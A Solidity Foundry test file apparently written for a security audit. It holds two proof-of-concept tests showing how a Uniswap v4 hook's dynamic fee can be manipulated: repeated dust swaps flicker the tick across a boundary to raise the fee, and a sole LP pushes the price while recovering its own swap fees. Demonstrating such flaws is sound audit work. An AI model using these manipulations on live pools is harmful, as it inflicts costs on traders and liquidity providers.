// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/console2.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {HookTestBase} from "./utils/HookTestBase.sol";

contract AuditPoC is HookTestBase {
    using PoolIdLibrary for PoolKey;

    function setUp() public {
        _baseSetUp();
    }

    /// PoC-1: one dust swap per block that flips the tick across a boundary (price moves by 1 unit of
    /// sqrtPriceX96) raises the fee from the floor, at a cost of a few wei + gas.
    function test_poc_tickBoundaryFlicker() public {
        uint160 pB = TickMath.getSqrtPriceAtTick(0); // pool sits exactly here after setUp (tick 0)
        assertEq(_sqrtPrice(hookKey), pB);
        uint256 b0 = currency0.balanceOfSelf();
        uint256 b1 = currency1.balanceOfSelf();
        uint256 gasUsed;
        for (uint256 i; i < 15000; i++) {
            uint256 g = gasleft();
            if (i % 2 == 0) _moveToPrice(hookKey, pB - 1); // tick 0 -> -1
            else _moveToPrice(hookKey, pB); // tick -1 -> 0
            gasUsed += g - gasleft();
            vm.roll(block.number + 1);
            if (i % 5 == 4) vm.warp(block.timestamp + 1); // 200ms blocks
            if (i == 299 || i == 1499 || i == 2999 || i == 5999 || i == 8999 || i == 14999) {
                console2.log("blocks", i + 1, "fee next block (pips)", hook.currentFee(hookId));
            }
        }
        uint256 spent = (b0 + b1) - (currency0.balanceOfSelf() + currency1.balanceOfSelf());
        console2.log("attacker total token cost (wei, both tokens):", spent);
        console2.log("avg gas per attack swap incl. test router:", gasUsed / 15000);
        assertGt(hook.currentFee(hookId), 2000); // 4x the 500 floor
        assertLt(spent, 1e6); // < 1e-12 token
    }

    /// PoC-2: the cross-block push of the doc's cost table, done by the LP who owns the liquidity:
    /// the swap fees come back to the attacker.
    function test_poc_soleLpPushCostsNothing() public {
        _moveTo(hookKey, 40);
        _nextBlock(2);
        _swap(hookKey, true, -TINY);
        uint160 p = _sqrtPrice(hookKey);
        modifyLiquidityRouter.modifyLiquidity(hookKey, ModifyLiquidityParams(WIDE_LOWER, WIDE_UPPER, 0, 0), ZERO_BYTES);
        uint256 b0 = currency0.balanceOfSelf();
        uint256 b1 = currency1.balanceOfSelf();
        (BalanceDelta push,) = _moveTo(hookKey, 140);
        uint256 notional = uint256(uint128(-push.amount1()));
        _nextBlock(2);
        (, uint24 feeNext) = _moveToPrice(hookKey, p);
        uint256 lossBeforeFees = (b0 + b1) - (currency0.balanceOfSelf() + currency1.balanceOfSelf());
        // collect LP fees (the test contract is the only LP, via modifyLiquidityRouter)
        modifyLiquidityRouter.modifyLiquidity(hookKey, ModifyLiquidityParams(WIDE_LOWER, WIDE_UPPER, 0, 0), ZERO_BYTES);
        uint256 a = currency0.balanceOfSelf() + currency1.balanceOfSelf();
        console2.log("notional", notional / 1e18, "fee next block", feeNext);
        console2.log("loss before collecting LP fees (1e12):", lossBeforeFees / 1e12);
        if (a >= b0 + b1) console2.log("net GAIN after collecting (wei):", a - (b0 + b1));
        else console2.log("net loss after collecting (wei):", (b0 + b1) - a);
        assertGt(feeNext, 3000);
    }
}
